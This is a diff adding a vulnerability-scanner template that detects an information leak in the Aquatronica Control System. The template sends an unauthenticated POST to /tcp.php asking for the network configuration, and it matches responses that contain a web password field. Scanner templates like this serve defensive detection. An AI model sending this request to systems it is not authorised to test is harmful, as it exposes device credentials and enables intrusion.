@@ -1,0 +1,29 @@
+id: aquatronica-control-system-tcp-info-leak
+info:
+  name: Aquatronica Control System TCP Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-leak
+http:
+  - raw:
+      - |
+        POST /tcp.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        function_id=tcp_xml_request&command=WS_GET_NETWORK_CFG
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "NetworkConfig"
+          - "WEB_PASSWORD"
+          - "system_name"
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
